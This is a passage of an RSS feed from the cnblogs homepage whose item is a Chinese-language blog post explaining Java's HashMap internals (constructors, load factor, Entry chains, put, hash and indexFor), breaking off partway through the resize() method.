<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>JAVA提高十二：HashMap深入分析 - pony1223</title>
<link>http://www.cnblogs.com/pony1223/p/7795882.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pony1223/p/7795882.html</guid>
<description>&lt;p&gt;&lt;span&gt;首先想说的是关于HashMap源码的分析园子里面应该有很多，并且都是分析得很不错的文章，但是我还是想写出自己的学习总结，以便加深自己的理解，因此就有了此文，另外因为小孩过来了，因此更新速度可能放缓了，(#^.^#)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、HashMap的简单使用&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;学习任何一个集合，首先最基本的是学会使用，因此首先我们看下如何使用HashMap，以及我们经常使用的方法又有哪些，代码如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; study.collection;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.HashMap;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Map;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; TestMap
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) 
    {
        Map map &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; HashMap();
        map.put(&lt;/span&gt;&quot;张三&quot;, &lt;span&gt;new&lt;/span&gt; Wife(&quot;六亦菲&quot;&lt;span&gt;));
        map.put(&lt;/span&gt;&quot;李四&quot;,&lt;span&gt;new&lt;/span&gt; Wife(&quot;杨咪&quot;&lt;span&gt;));
        map.put(&lt;/span&gt;&quot;王五&quot;,&lt;span&gt;new&lt;/span&gt; Wife(&quot;赵丽英&quot;&lt;span&gt;));
        
        System.out.println(map.get(&lt;/span&gt;&quot;张三&quot;&lt;span&gt;));

        System.out.println(map.containsKey(&lt;/span&gt;&quot;王五&quot;&lt;span&gt;));
        
        map.remove(&lt;/span&gt;&quot;李四&quot;&lt;span&gt;);
        
        System.out.println(map.size());
        
    }

}


&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Wife
{
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Wife()
    {
        
    }
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Wife(String name) {
        &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String toString()
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;Wife [name=&quot; + name + &quot;]&quot;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; &lt;span&gt;上面主要演示了hashmap 中的几个主要方法，如put()  get()  remove()  size() 等方法，实际map中还有很多的方法，如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/401339/201711/401339-20171107074108075-328201607.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;说明：圆形 -- 对外提供的public 方法   正方形 ---内部使用的private 方法  三角形 --- static 方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;二、HashMap的概述&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;上面我们介绍了HashMap的基本使用方法，下面我们进一步来分析下HashMap，而不在仅仅在于会使用。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;2.1 HashMap的定义&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap基于哈希表的 Map 接口的实现。此实现提供所有可选的映射操作，并允许使用 null 值和 null 键。（&lt;strong&gt;除了不同步和允许使用 null 之外，HashMap 类与 Hashtable 大致相同.&lt;/strong&gt;）此类不保证映射的顺序，特别是它不保证该顺序恒久不变。&lt;strong&gt;值得注意的是HashMap不是线程安全的，如果想要线程安全的HashMap，可以通过Collections类的静态方法synchronizedMap获得线程安全的HashMap。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
 Map map = Collections.synchronizedMap(&lt;span&gt;new&lt;/span&gt; HashMap());
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;我们来看下Map的类定义：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; HashMap&amp;lt;K,V&amp;gt;
    &lt;span&gt;extends&lt;/span&gt; AbstractMap&amp;lt;K,V&amp;gt;
    &lt;span&gt;implements&lt;/span&gt; Map&amp;lt;K,V&amp;gt;, Cloneable, Serializable
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt; 从上面的HashMap 此类的定义来看，我可以这样来理解HashMap; 它实现了Map接口，继承了AbstractMap,其中Map接口定义了键映射到值得规则，而AbstractMap类提供了Map接口中主要的实现，是为了最大限度的减少实际开发人员在实现HashMap所需要的工作。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;2.2 HashMap的构造函数&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap提供了四个构造函数：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap()：构造一个具有默认初始容量 (16) 和默认加载因子 (0.75) 的空 HashMap。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap(int initialCapacity)：构造一个带指定初始容量和默认加载因子 (0.75) 的空 HashMap。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap(int initialCapacity, float loadFactor)：构造一个带指定初始容量和加载因子的空 HashMap。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap(Map&amp;lt;? extends K,? extends V&amp;gt; m) ：构造一个映射关系与指定 Map 相同的新 HashMap。&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在这里提到了两个参数：初始容量，加载因子。这两个参数是影响HashMap性能的重要参数，其中容量表示哈希表中桶的数量，初始容量是创建哈希表时的容量，加载因子是哈希表在其容量扩容之前可以达到多满的一种尺度【阀值=加载因子*容量】，&lt;strong&gt;加载因子它衡量的是一个散列表的空间的使用程度&lt;/strong&gt;，加载因子越大表示散列表的装填程度越高，反之愈小。对于使用链表法的散列表来说，查找一个元素的平均时间是O(1+a)，因此&lt;strong&gt;如果加载因子越大，对空间的利用更充分，然而后果是查找效率的降低；如果&lt;/strong&gt;加&lt;/span&gt;载因子太小，那么散列表的数据将过于稀疏，对空间造成严重浪费。系统默认&lt;strong&gt;加&lt;/strong&gt;载因子为0.75，一般情况下我们是无需修改的。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap是一种支持快速存取的数据结构，要了解它的性能必须要了解它的数据结构。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;2.3 HashMap的数据结构&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 我们知道在Java中最常用的两种结构是数组和模拟指针(引用)，几乎所有的数据结构都可以利用这两种来组合实现，HashMap也是如此，其底层为数组+链表实现；如果采用数组那么必然就涉及到数组的索引的问题，那么这个索引是什么呢？就是通过key的hashcode计算出来的，采用数组的好处就在于可以快速的访问，可以回忆下List集合中ArrayList.就是典型的底层为数组，所以访问的速度很快，但是如果单纯的采用数组，那么为什么hashmap 又有链表结构呢？这个是因为数组的缺陷是插入元素和删除元素比较慢，而链表具备的就是插入和删除快的特点，因此为了结合这两种特性于是就采用了数组加链表的结构进行。我们看下源码就可以看出：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; HashMap(&lt;span&gt;int&lt;/span&gt; initialCapacity, &lt;span&gt;float&lt;/span&gt;&lt;span&gt; loadFactor) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;初始容量不能&amp;lt;0&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (initialCapacity &amp;lt; 0&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;Illegal initial capacity: &quot;
                    +&lt;span&gt; initialCapacity);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;初始容量不能 &amp;gt; 最大容量值，HashMap的最大容量值为2^30&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (initialCapacity &amp;gt;&lt;span&gt; MAXIMUM_CAPACITY)
            initialCapacity &lt;/span&gt;=&lt;span&gt; MAXIMUM_CAPACITY;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;负载因子不能 &amp;lt; 0&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (loadFactor &amp;lt;= 0 ||&lt;span&gt; Float.isNaN(loadFactor))
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;Illegal load factor: &quot;
                    +&lt;span&gt; loadFactor);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 计算出大于 initialCapacity 的最小的 2 的 n 次方值。&lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; capacity = 1&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (capacity &amp;lt;&lt;span&gt; initialCapacity)
            capacity &lt;/span&gt;&amp;lt;&amp;lt;= 1&lt;span&gt;;
        
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.loadFactor =&lt;span&gt; loadFactor;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置HashMap的容量极限，当HashMap的容量达到该极限时就会进行扩容操作&lt;/span&gt;
        threshold = (&lt;span&gt;int&lt;/span&gt;) (capacity *&lt;span&gt; loadFactor);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;初始化table数组&lt;/span&gt;
        table = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Entry[capacity];
        init();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;从源码中可以看出，每次新建一个HashMap时，都会初始化一个table数组。table数组的元素为Entry节点。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Entry&amp;lt;K,V&amp;gt; &lt;span&gt;implements&lt;/span&gt; Map.Entry&amp;lt;K,V&amp;gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; K key;
        V value;
        Entry&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; next;
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; hash;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * Creates new entry.
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        Entry(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; h, K k, V v, Entry&amp;lt;K,V&amp;gt;&lt;span&gt; n) {
            value &lt;/span&gt;=&lt;span&gt; v;
            next &lt;/span&gt;=&lt;span&gt; n;
            key &lt;/span&gt;=&lt;span&gt; k;
            hash &lt;/span&gt;=&lt;span&gt; h;
        }
        .......
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;其中Entry为HashMap的内部类，它包含了键key、值value、下一个节点next，以及hash值，这是非常重要的，正是由于Entry才构成了table数组的项为链表。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;总结：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap的底层主要是基于数组和链表来实现的，它之所以有相当快的查询速度主要是因为它是通过计算散列码来决定存储的位置。HashMap中主要是通过key的hashCode来计算hash值的，只要hashCode相同，计算出来的hash值就一样。如果存储的对象对多了，就有可能不同的对象所算出来的hash值是相同的，这就出现了所谓的hash冲突。学过数据结构的同学都知道，解决hash冲突的方法有很多，HashMap底层是通过链表来解决hash冲突的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/401339/201711/401339-20171108211802794-964072247.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图中，0~15部分即代表哈希表，也称为哈希数组，数组的每个元素都是一个单链表的头节点，链表是用来解决冲突的，如果不同的key映射到了数组的同一位置处，就将其放入单链表中。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;从上图我们可以发现哈希表是由数组+链表组成的，一个长度为16的数组中，每个元素存储的是一个链表的头结点Bucket桶。那么这些元素是按照什么样的规则存储到数组中呢。一般情况是通过hash(key)%len获得，也就是元素的key的哈希值对数组长度取模得到。比如上述哈希表中，12%16=12,28%16=12,108%16=12,140%16=12。所以12、28、108以及140都存储在数组下标为12的位置。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap其实也是一个线性的数组实现的,所以可以理解为其存储数据的容器就是一个线性数组。这可能让我们很不解，一个线性的数组怎么实现按键值对来存取数据呢？这里HashMap有做一些处理。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap里面实现一个静态内部类Entry【可以看上面的源码】，其重要的属性有 key , value, next【单链表】，从属性key,value我们就能很明显的看出来Entry就是HashMap键值对实现的一个基础bean，我们上面说到HashMap的基础就是一个线性数组，这个数组就是Entry[]，Map里面的内容都保存在Entry[]里面。&lt;strong&gt;即HashMap其实就是一个Entry数组，Entry对象中包含了键和值，其中next也是一个Entry对象，它就是用来处理hash冲突的，形成一个链表。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;说明：链表结构中如果存放的数据太多，JDK1.8会使用红黑树存储来提高查找（get）性能.&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、HashMap的源码解析&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们先重点分析HashMap的两个重要方法：put 和 get方法，也是我们最常使用的方法：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V put(K key, V value) {
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“key为null”，则将该键值对添加到table[0]中。&lt;/span&gt;
         &lt;span&gt;if&lt;/span&gt; (key == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) 
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; putForNullKey(value);
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 若“key不为null”，则计算该key的哈希值，然后将其添加到该哈希值对应的链表中。&lt;/span&gt;
         &lt;span&gt;int&lt;/span&gt; hash =&lt;span&gt; hash(key.hashCode());
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;搜索指定hash值在对应table中的索引&lt;/span&gt;
         &lt;span&gt;int&lt;/span&gt; i =&lt;span&gt; indexFor(hash, table.length);
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 循环遍历Entry数组,若“该key”对应的键值对已经存在，则用新的value取代旧的value。然后退出！&lt;/span&gt;
         &lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e = table[i]; e != &lt;span&gt;null&lt;/span&gt;; e =&lt;span&gt; e.next) { 
             Object k;
              &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.hash == hash &amp;amp;&amp;amp; ((k = e.key) == key || key.equals(k))) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果key相同则覆盖并返回旧值&lt;/span&gt;
                  V oldValue =&lt;span&gt; e.value;
                 e.value &lt;/span&gt;=&lt;span&gt; value;
                 e.recordAccess(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
                 &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;
              }
         }
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;修改次数+1&lt;/span&gt;
         modCount++&lt;span&gt;;
     &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将key-value添加到table[i]处&lt;/span&gt;
&lt;span&gt;     addEntry(hash, key, value, i);
     &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;上面程序中用到了一个重要的内部接口：Map.Entry，每个 Map.Entry 其实就是一个 key-value 对。从上面程序中可以看出：当系统决定存储 HashMap 中的 key-value 对时，完全没有考虑 Entry 中的 value，仅仅只是根据 key 来计算并决定每个 Entry 的存储位置。这也说明了前面的结论：我们完全可以把 Map 集合中的 value 当成 key 的附属，当系统决定了 key 的存储位置之后，value 随之保存在那里即可。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;我们慢慢的来分析这个函数，第2和3行的作用就是处理key值为null的情况，我们看看putForNullKey(value)方法：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; V putForNullKey(V value) {
          &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;K,V&amp;gt; e = table[0]; e != &lt;span&gt;null&lt;/span&gt;; e =&lt;span&gt; e.next) {
              &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.key == &lt;span&gt;null&lt;/span&gt;) {   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果有key为null的对象存在，则覆盖掉&lt;/span&gt;
                  V oldValue =&lt;span&gt; e.value;
                  e.value &lt;/span&gt;=&lt;span&gt; value;
                  e.recordAccess(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
                  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;
             }
         }
         modCount&lt;/span&gt;++&lt;span&gt;;
         addEntry(&lt;/span&gt;0, &lt;span&gt;null&lt;/span&gt;, value, 0); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果键为null的话，则hash值为0&lt;/span&gt;
         &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
 }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;注意：如果key为null的话，hash值为0，对象存储在数组中索引为0的位置。即table[0]&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;我们再回去看看put方法中第4行，它是通过key的hashCode值计算hash码，下面是计算hash码的函数：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算hash值的方法 通过键的hashCode来计算&lt;/span&gt;
     &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; hash(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; h) {
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This function ensures that hashCodes that differ only by
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; constant multiples at each bit position have a bounded
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; number of collisions (approximately 8 at default load factor).&lt;/span&gt;
         h ^= (h &amp;gt;&amp;gt;&amp;gt; 20) ^ (h &amp;gt;&amp;gt;&amp;gt; 12&lt;span&gt;);
         &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; h ^ (h &amp;gt;&amp;gt;&amp;gt; 7) ^ (h &amp;gt;&amp;gt;&amp;gt; 4&lt;span&gt;);
     }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;得到hash码之后就会通过hash码去计算出应该存储在数组中的索引，计算索引的函数如下：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; indexFor(&lt;span&gt;int&lt;/span&gt; h, &lt;span&gt;int&lt;/span&gt; length) { &lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据hash值和数组长度算出索引值&lt;/span&gt;
         &lt;span&gt;return&lt;/span&gt; h &amp;amp; (length-1);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里不能随便算取，用hash&amp;amp;(length-1)是有原因的，这样可以确保算出来的索引是在数组大小范围内，不会超出&lt;/span&gt;
     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这个我们要重点说下，我们一般对哈希表的散列很自然地会想到用hash值对length取模（即除法散列法），Hashtable中也是这样实现的，这种方法基本能保证元素在哈希表中散列的比较均匀，但取模会用到除法运算，效率很低，HashMap中则通过h&amp;amp;(length-1)的方法来代替取模。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;h&amp;amp;(length - 1)，这句话除了上面的取模运算外还有一个非常重要的责任：均匀分布table数据和充分利用空间。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接下来，我们分析下为什么哈希表的容量一定要是2的整数次幂。首先，length为2的整数次幂的话，h&amp;amp;(length-1)就相当于对length取模，这样便保证了散列的均匀，同时也提升了效率；其次，length为2的整数次幂的话，为偶数，这样length-1为奇数，奇数的最后一位是1，这样便保证了h&amp;amp;(length-1)的最后一位可能为0，也可能为1（这取决于h的值），即与后的结果可能为偶数，也可能为奇数，这样便可以保证散列的均匀性，而如果length为奇数的话，很明显length-1为偶数，它的最后一位是0，这样h&amp;amp;(length-1)的最后一位肯定为0，即只能为偶数，这样任何hash值都只会被散列到数组的偶数下标位置上，这便浪费了近一半的空间，因此，length取2的整数次幂，是为了使不同hash值发生碰撞的概率较小，这样就能使元素在哈希表中均匀地散列。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;举例：这里我们假设length为16(2^n)和15，h为5、6、7。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/401339/201711/401339-20171108221925341-316824890.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;当length=15时，6和7的结果一样，这样表示他们在table存储的位置是相同的，也就是产生了碰撞，6、7就会在一个位置形成链表，这样就会导致查询速度降低。诚然这里只分析三个数字不是很多，那么我们就看0-15。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/401339/201711/401339-20171108222111513-738093723.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;从上面的图表中我们看到总共发生了8此碰撞，同时发现浪费的空间非常大，有1、3、5、7、9、11、13、15处没有记录，也就是没有存放数据。这是因为他们在与14进行&amp;amp;运算时，得到的结果最后一位永远都是0，即0001、0011、0101、0111、1001、1011、1101、1111位置处是不可能存储数据的，空间减少，进一步增加碰撞几率，这样就会导致查询速度慢。而当length = 16时，length – 1 = 15 即1111，那么进行低位&amp;amp;运算时，值总是与原来hash值相同，而进行高位运算时，其值等于其低位值。&lt;span&gt;所以说当length = 2^n时，不同的hash值发生碰撞的概率比较小，这样就会使得数据在table数组中分布较均匀，查询速度也较快。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;根据上面 put 方法的源代码可以看出，当程序试图将一个key-value对放入HashMap中时，程序首先根据该 key 的 hashCode() 返回值决定该 Entry 的存储位置：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;　　如果两个 Entry 的 key 的 hashCode() 返回值相同，那它们的存储位置相同。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;　　如果这两个 Entry 的 key 通过 equals 比较返回 true，新添加 Entry 的 value 将覆盖集合中原有 Entry 的 value，但key不会覆盖。　　&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;　　如果这两个 Entry 的 key 通过 equals 比较返回 false，新添加的 Entry 将与集合中原有 Entry 形成 Entry 链，而且新添加的 Entry 位于 Entry 链的头部&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;具体说明继续看 addEntry() 方法的说明。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; addEntry(&lt;span&gt;int&lt;/span&gt; hash, K key, V value, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; bucketIndex) {
         Entry&lt;/span&gt;&amp;lt;K,V&amp;gt; e = table[bucketIndex]; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果要加入的位置有值，将该位置原先的值设置为新entry的next,也就是新entry链表的下一个节点&lt;/span&gt;
         table[bucketIndex] = &lt;span&gt;new&lt;/span&gt; Entry&amp;lt;&amp;gt;&lt;span&gt;(hash, key, value, e);
         &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (size++ &amp;gt;= threshold) &lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果大于临界值就扩容&lt;/span&gt;
             resize(2 * table.length); &lt;span&gt;//&lt;/span&gt;&lt;span&gt;以2的倍数扩容&lt;/span&gt;
 }
&lt;/pre&gt;&lt;/div&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;参数bucketIndex就是indexFor函数计算出来的索引值，第2行代码是取得数组中索引为bucketIndex的Entry对象，第3行就是用hash、key、value构建一个新的Entry对象放到索引为bucketIndex的位置，并且将该位置原先的对象设置为新对象的next构成链表。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;第4行和第5行就是判断put后size是否达到了临界值threshold，如果达到了临界值就要进行扩容，HashMap扩容是扩为原来的两倍。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;&lt;span&gt;resize()方法如下：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;span&gt;重新调整HashMap的大小，newCapacity是调整后的单位&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; resize(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; newCapacity) {
          Entry[] oldTable &lt;/span&gt;=&lt;span&gt; table;
